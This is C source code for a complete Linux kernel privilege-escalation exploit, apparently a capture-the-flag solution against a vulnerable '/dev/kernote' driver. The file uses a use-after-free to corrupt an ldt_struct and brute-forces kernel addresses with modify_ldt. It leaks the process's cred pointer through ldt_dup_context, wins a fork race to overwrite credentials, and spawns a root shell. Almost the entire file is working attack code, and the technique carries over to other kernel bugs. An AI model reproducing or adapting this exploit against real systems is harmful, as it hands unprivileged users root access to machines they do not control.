#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <asm/ldt.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/wait.h>

#define CMD_SELECT 0x6666
#define CMD_ADD    0x6667
#define CMD_DELETE 0x6668
#define CMD_EDIT   0x6669
#define CMD_SHOW   0x666a

int dev;
unsigned long cred = 0;

/* ldt structs */
struct user_desc ud = {
    .base_addr = 0x000000,
    .limit = 0,
    .seg_32bit = 0,
    .contents = 0,
    .read_exec_only = 0,
    .limit_in_pages = 0,
    .seg_not_present = 0,
    .useable = 0,
    .lm = 0,
};

/* Helper functions */
void debug(){
    puts("paused execution");
    getchar();
}

void open_dev(){
    dev = open("/dev/kernote",O_RDWR);
    puts("[+]Interacting with device");
}

int read_ldt(void *out, int size){
    return syscall(SYS_modify_ldt, 0, out, size);
}

void write_ldt(){
    syscall(SYS_modify_ldt, 1, &ud, sizeof(struct user_desc));
}

int do_select(unsigned long idx){
    ioctl(dev,CMD_SELECT,idx);
    return idx;
}

void do_add(unsigned long idx){
    ioctl(dev,CMD_ADD,idx);
}

void do_delete(unsigned long idx){
    ioctl(dev,CMD_DELETE,idx);
}

void do_edit(unsigned long val){
    ioctl(dev,CMD_EDIT,val);
}

void do_show(){
    ioctl(dev,CMD_SHOW,0);
}

/* Exploit */
int main(){
    open_dev();

    /* UAF */
    do_add(0);
    do_select(0);
    do_delete(0);

    /* Bruteforce valid address w/ ldt_struct */
    char junk[8];
    unsigned long cur = 0xffff888000000000;
    int r;

    /* Allocate ldt_struct */
    ud.entry_number = 0x8000/8,
    write_ldt();
    while(1){

        /* Manipulate ldt_struct->entries pointer */
        do_edit(cur);

        /* copy_to_user(lt_struct->entries) */
        r = read_ldt(junk, 8);

        /* If no error from copy_to_user, address is valid*/
        if(r >= 0){
            break;
        }
        cur+=0x40000000;
    }
    printf("[+]Kernel leak: %p\n", cur);

    /* Bypass hardened usercopy w/ ldt_dup_context and leak task_struct */
    char *data = calloc(1, 0x8000);
    int pid = getpid();
    int pf[2];
    unsigned long off = cur;

    prctl(PR_SET_NAME, "c4n4ryyy!");
    pipe(pf);
    while(1){
        cur += 0x8000;

        /* Manipulate task_struct->entries */
        do_edit(cur);

        /* Trigger ldt_dup_context */
        if(!fork()){

            /* Copy memcpy'd leaks to userland */
            read_ldt(data, 0x8000);

            /* Locate task_struct->comm */
            unsigned long *locate = (unsigned long *)data;
            unsigned long found = 0;
            while ((unsigned long)locate < (unsigned long)data + 0x8000){
                locate = memmem((char *)locate, (unsigned long)data+0x8000-(unsigned long)locate, "c4n4ryyy!", 9);

                /* If not found try next segment */
                if (locate == NULL ){
                    break;
                }

                /* Found comm field, check if pid is the same as ours */
                if ((locate[-2] > off) && (locate[-3] > off ) && (int)locate[-58] == pid){
                    found = locate[-2];
                    printf("[+]current->comm: %s\n", (char *)locate);
                    printf("[+]current->cred: %p\n",locate[-2]);
                    printf("[+]current->pid: %d\n",locate[-58]);
                    break;
                }
                locate += 9;
            }
            write(pf[1], &found, 8);
            exit(0);
        }
        wait(NULL);
        read(pf[0], &cred, 8);

        /* We have our leak */
        if (cred){
            break;
        }
    }

    /* Perpare payload to overwrite cred */
    ud.entry_number=2;

    /* Race new_ldt->entries */
    do_edit(cred+4);
    if(!fork()){
        if(!fork()){
            cpu_set_t cpu_set;
            CPU_ZERO(&cpu_set);
            CPU_SET(0,&cpu_set);
            sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
            sleep(1);

            /* UAF */
            for(int i = 1; i < 15; i++){ do_add(i); }
            do_select(11);
            for(int i = 1; i < 15; i++){ do_delete(i); }

            CPU_ZERO(&cpu_set);
            CPU_SET(1,&cpu_set);
            sched_setaffinity(0,sizeof(cpu_set),&cpu_set);

            /* Overwrite entries pointer */
            while(1){
                do_edit(cred+4);
            }
        }
        cpu_set_t cpu_set;
        CPU_ZERO(&cpu_set);
        CPU_SET(0,&cpu_set);
        sched_setaffinity(0,sizeof(cpu_set),&cpu_set);
        sleep(3);

        /* Write ldt at at corrupted pointer */
        write_ldt();
        sleep(100);
    } else{
        sleep(5);

        /* Get root */
        setreuid(0,0);
        setregid(0,0);
        if (!getuid()){
            puts("[+]Got r00t");
            system("/bin/sh");
        } else{
            puts("[-] Failed to corrupt entries");
        }
    }

    return 0;
}